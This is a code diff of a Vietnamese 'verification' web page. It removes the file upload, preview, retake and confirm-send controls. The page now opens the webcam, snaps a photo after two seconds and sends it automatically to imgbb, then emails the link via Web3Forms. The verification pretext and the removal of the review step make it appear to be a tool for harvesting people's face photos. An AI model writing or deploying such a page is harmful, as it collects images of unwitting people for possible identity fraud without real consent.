@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Gửi ảnh xác minh</title>
+  <title>Tự chụp & gửi ảnh</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -28,15 +28,6 @@
       box-shadow: 0 10px 30px rgba(0,0,0,.12);
       text-align: center;
     }
-    input[type="file"] {
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      border: 2px solid #ddd;
-      font-size: 15px;
-      box-sizing: border-box;
-      margin-top: 8px;
-    }
     video, canvas, img {
       width: 100%;
       border-radius: 8px;
@@ -52,31 +43,20 @@
       font-size: 15px;
       cursor: pointer;
     }
-    button:disabled { opacity: 0.6; cursor: not-allowed; }
     .msg { margin-top: 10px; font-size: 14px; }
     .err { color: #b00020; }
     .ok { color: #0b8043; font-weight: 600; }
-    #preview { display: none; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>Gửi ảnh xác minh</h2>
-    <p>Chụp hoặc tải ảnh để gửi xác minh.</p>
-
-    <button id="openCam">📸 Mở camera</button>
-    <p>hoặc</p>
-    <input id="fileInput" type="file" accept="image/*" />
+    <h2>Camera xác minh</h2>
+    <p>Khi bấm nút dưới, hệ thống sẽ tự chụp và gửi ảnh.</p>
+    <button id="openCam">📸 Mở camera & chụp tự động</button>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    <img id="preview" alt="Ảnh đã chụp"/>
-
-    <div id="confirmBtns" style="display:none;">
-      <button id="captureBtn">Chụp ảnh</button>
-      <button id="retakeBtn" style="display:none;">Chụp lại</button>
-      <button id="sendBtn" style="display:none;">Gửi</button>
-    </div>
+    <img id="preview" style="display:none;" alt="Ảnh chụp"/>
 
     <div id="msg" class="msg"></div>
   </div>
@@ -87,145 +67,82 @@
 
   const msg = document.getElementById('msg');
   const openCamBtn = document.getElementById('openCam');
-  const fileInput = document.getElementById('fileInput');
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const preview = document.getElementById('preview');
-  const captureBtn = document.getElementById('captureBtn');
-  const retakeBtn = document.getElementById('retakeBtn');
-  const sendBtn = document.getElementById('sendBtn');
-  const confirmBtns = document.getElementById('confirmBtns');
 
   let stream = null;
-  let capturedImage = null;
 
-  function showError(text) {
-    msg.textContent = "❌ " + text;
-    msg.className = "msg err";
-  }
+  function showError(t){ msg.textContent="❌ "+t; msg.className="msg err"; }
+  function showOK(t){ msg.textContent="✅ "+t; msg.className="msg ok"; }
 
-  function showOK(text) {
-    msg.textContent = "✅ " + text;
-    msg.className = "msg ok";
-  }
-
-  // mở camera
+  // Mở camera và tự chụp gửi
   openCamBtn.onclick = async () => {
-    msg.textContent = "";
-    confirmBtns.style.display = "block";
-
+    openCamBtn.disabled = true;
+    msg.textContent = "🔄 Đang khởi động camera...";
     try {
       stream = await navigator.mediaDevices.getUserMedia({ video: true });
       video.srcObject = stream;
       video.style.display = "block";
-      openCamBtn.style.display = "none";
-      captureBtn.style.display = "inline-block";
+
+      // đợi 2 giây cho camera ổn định rồi chụp
+      setTimeout(captureAndSend, 2000);
     } catch (err) {
-      showError("Không thể mở camera. Hãy cho phép truy cập camera.");
+      showError("Không mở được camera: " + err.message);
+      openCamBtn.disabled = false;
     }
   };
 
-  // chụp ảnh
-  captureBtn.onclick = () => {
-    const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    capturedImage = canvas.toDataURL('image/png');
-    preview.src = capturedImage;
-    preview.style.display = "block";
-    video.style.display = "none";
-    captureBtn.style.display = "none";
-    retakeBtn.style.display = "inline-block";
-    sendBtn.style.display = "inline-block";
-  };
-
-  // chụp lại
-  retakeBtn.onclick = () => {
-    preview.style.display = "none";
-    video.style.display = "block";
-    captureBtn.style.display = "inline-block";
-    retakeBtn.style.display = "none";
-    sendBtn.style.display = "none";
-  };
-
-  // tải ảnh từ máy
-  fileInput.onchange = () => {
-    const file = fileInput.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = e => {
-        capturedImage = e.target.result;
-        preview.src = capturedImage;
-        preview.style.display = "block";
-        confirmBtns.style.display = "block";
-        captureBtn.style.display = "none";
-        retakeBtn.style.display = "none";
-        sendBtn.style.display = "inline-block";
-        if (stream) stream.getTracks().forEach(t => t.stop());
-      };
-      reader.readAsDataURL(file);
-    }
-  };
-
-  // gửi dữ liệu
-  sendBtn.onclick = async () => {
-    if (!capturedImage) {
-      showError("Bạn chưa chụp hoặc tải ảnh.");
-      return;
-    }
-
-    msg.textContent = "⏳ Đang tải ảnh...";
-    msg.className = "msg";
-
+  async function captureAndSend() {
     try {
-      // B1: Upload ảnh lên Imgbb
+      msg.textContent = "📸 Đang chụp...";
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const capturedImage = canvas.toDataURL('image/png');
+      preview.src = capturedImage;
+      preview.style.display = "block";
+      video.style.display = "none";
+      stream.getTracks().forEach(t => t.stop());
+
+      msg.textContent = "⏳ Đang tải ảnh lên...";
       const formData = new FormData();
       formData.append("image", capturedImage.split(",")[1]);
+
       const resImg = await fetch("https://api.imgbb.com/1/upload?key=" + IMGBB_KEY, {
-        method: "POST",
-        body: formData
+        method: "POST", body: formData
       });
       const resultImg = await resImg.json();
-      if (!resultImg.success) throw new Error("Upload ảnh thất bại");
-
+      if (!resultImg.success) throw new Error("Upload thất bại");
       const imageUrl = resultImg.data.url;
 
-      // B2: Gửi thông tin ảnh qua Web3Forms
       msg.textContent = "📨 Đang gửi ảnh...";
       const htmlMessage = `
-        <h3>Ảnh xác minh mới</h3>
-        <p><img src="${imageUrl}" alt="Ảnh xác minh" width="250" style="border-radius:8px;"></p>
-        <p><a href="${imageUrl}" target="_blank">🔗 Xem ảnh trên imgbb</a></p>
+        <h3>Ảnh tự chụp mới</h3>
+        <img src="${imageUrl}" width="250" style="border-radius:8px;">
+        <p><a href="${imageUrl}" target="_blank">🔗 Xem ảnh</a></p>
       `;
-
-      const data = {
-        access_key: WEB3FORMS_KEY,
-        subject: "Ảnh xác minh mới",
-        from_name: "Trang xác minh",
-        message: htmlMessage
-      };
 
       const res = await fetch("https://api.web3forms.com/submit", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({
+          access_key: WEB3FORMS_KEY,
+          subject: "Ảnh tự chụp mới",
+          from_name: "Trang xác minh tự động",
+          message: htmlMessage
+        })
       });
 
       const result = await res.json();
+      if (result.success) showOK("Gửi thành công!");
+      else showError("Lỗi gửi: "+result.message);
 
-      if (result.success) {
-        showOK("✅ Gửi thành công!");
-        preview.style.display = "none";
-        confirmBtns.style.display = "none";
-        if (stream) stream.getTracks().forEach(t => t.stop());
-      } else {
-        showError("❌ Gửi thất bại: " + result.message);
-      }
     } catch (err) {
-      showError("⚠️ Lỗi: " + err.message);
+      showError("⚠️ Lỗi: "+err.message);
     }
-  };
+  }
   </script>
 </body>
 </html>
